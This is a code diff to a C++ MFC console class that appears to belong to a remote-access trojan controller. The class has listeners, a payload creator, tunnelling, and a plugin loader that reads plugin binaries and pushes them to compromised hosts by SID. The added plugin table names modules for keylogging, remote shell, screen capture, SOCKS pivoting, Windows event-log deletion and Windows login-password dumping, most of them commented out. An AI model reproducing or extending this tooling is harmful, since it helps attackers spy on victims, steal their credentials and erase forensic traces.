@@ -74,7 +74,18 @@ CremotemfcDlg::CremotemfcDlg(CWnd* pParent /*=nullptr*/)
 	m_pTaskEngine = new TaskEngine(this);
 	m_pTunnelHelpServer = std::make_shared<TunnelHelpServer>(this);
 	m_pTunnelHelpServer->Start();
+	m_pPluginManager = new PluginManager(m_hostinfo, this);
 	//m_pTunnelHelpServer = std::make_shared<TunnelHelpServer>(this);
+	m_descriptions[L"file"] = "File browser plugin";
+	/*m_descriptions[L"cmd"] = "Execute shell command";
+	m_descriptions[L"shell"] = "Execute shell command interactively";
+	m_descriptions[L"keylog"] = "Log user input";
+	m_descriptions[L"screen"] = "Remote desktop connection";
+	m_descriptions[L"screenshots"] = "Capture screen";
+	m_descriptions[L"sock5"] = "Provide access to remote LAN";
+	m_descriptions[L"portmap"] = "Map port between local and remote";
+	m_descriptions[L"eventclear"] = "Delete windows event";
+	m_descriptions[L"loginpass"] = "Dump windows login password";*/
 }
 
 void CremotemfcDlg::DoDataExchange(CDataExchange* pDX)
@@ -92,6 +103,7 @@ BEGIN_MESSAGE_MAP(CremotemfcDlg, CDialogEx)
 	ON_COMMAND(ID_32772, &CremotemfcDlg::OnOpenLisrenersDialog)
 	ON_COMMAND(ID_32773, &CremotemfcDlg::OnCreatorDialog)
 	ON_REGISTERED_MESSAGE(WM_UPDATE_HOSTINFO_MSG, OnUpdateHostInfo)
+	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB1, &CremotemfcDlg::OnTcnSelchangeTab1)
 END_MESSAGE_MAP()
 
 
@@ -344,7 +356,7 @@ int CremotemfcDlg::InitTab()
 	//tab.InsertItem(0, _T("事件"));
 	//tab.InsertItem(0, _T("监听"));
 	tab.InsertItem(0, _T("控制台"));
-	m_OneTabDialog = new OneTabDialog();
+	m_OneTabDialog = new OneTabDialog(this,this->m_pTaskEngine);
 	m_OneTabDialog->Create(IDD_DIALOG3, &tab);
 
 	m_OneTabDialog->SetParent(&tab);
@@ -402,6 +414,7 @@ void CremotemfcDlg::RealUpdateHostInfo(const HostInfo& hostinfo)
 	}
 
 	saveDB();
+
 }
 
 
@@ -563,6 +576,11 @@ TaskEngine* CremotemfcDlg::GetTaskEngine()
 	return m_pTaskEngine;
 }
 
+OneTabDialog* CremotemfcDlg::GetOneTabDialog()
+{
+	return m_OneTabDialog;
+}
+
 std::shared_ptr<Manager> CremotemfcDlg::GetManager(std::string sid)
 {
 	std::lock_guard<std::mutex> guard(m_resourceLock);
@@ -578,3 +596,75 @@ std::shared_ptr<Manager> CremotemfcDlg::GetManager(std::string sid)
 	}
 }
 
+void CremotemfcDlg::LoadAllPlugins(HostInfo hostinfo)
+{
+	this->m_hostinfo = hostinfo;
+	//获取插件根路径
+	CString rootPluginPath = getPluginRootPath();
+	for (auto pair : m_descriptions)
+	{
+		CString pluginName = pair.first;
+		CString pluginPath = rootPluginPath + "\\" + pluginName;
+		CFile file;
+		if (!file.Open(pluginPath, CFile::modeRead | CFile::typeBinary)) {
+			return;
+		}
+		// 1. 获取文件大小
+		ULONGLONG fileSize = file.GetLength();
+		if (fileSize == 0)
+		{
+			file.Close();
+			return;
+		}
+		// 2. 分配 ByteArray
+		ByteArray pluginData;
+		pluginData.SetSize(static_cast<int>(fileSize));
+
+		// 3. 读取文件
+		UINT bytesRead = file.Read(pluginData.m_buffer, pluginData.m_size);
+		file.Close();
+		if (bytesRead != pluginData.m_size)
+		{
+			// 读取失败或不完整
+			return;
+		}
+		this->GetTaskEngine()->pluginLoad(m_hostinfo.getSid(), pluginName, pluginData, m_pPluginManager);
+	}
+}
+
+CString CremotemfcDlg::getPluginRootPath()
+{
+	WCHAR strTempW[MAX_PATH];
+	//得到文件名
+	GetModuleFileNameW(NULL, strTempW, MAX_PATH);
+
+	CString strCurrentPath;
+
+	strCurrentPath = strTempW;
+
+	strCurrentPath = strCurrentPath.Left(strCurrentPath.ReverseFind('\\'));
+	return strCurrentPath;
+}
+
+
+
+void CremotemfcDlg::OnTcnSelchangeTab1(NMHDR* pNMHDR, LRESULT* pResult)
+{
+	// TODO: 在此添加控件通知处理程序代码
+	int nSel = tab.GetCurSel();  // 当前选中的 tab 索引
+	switch (nSel) {
+	
+	case 0:
+		//MessageBoxA(0, 0, 0, 0);
+		if (m_OneTabDialog)
+		{
+			m_OneTabDialog->ShowWindow(SW_SHOW);
+			m_vecListenersManager[0]->ShowWindow(SW_HIDE);
+		}
+		break;
+	default:
+		break;
+	}
+	
+	*pResult = 0;
+}
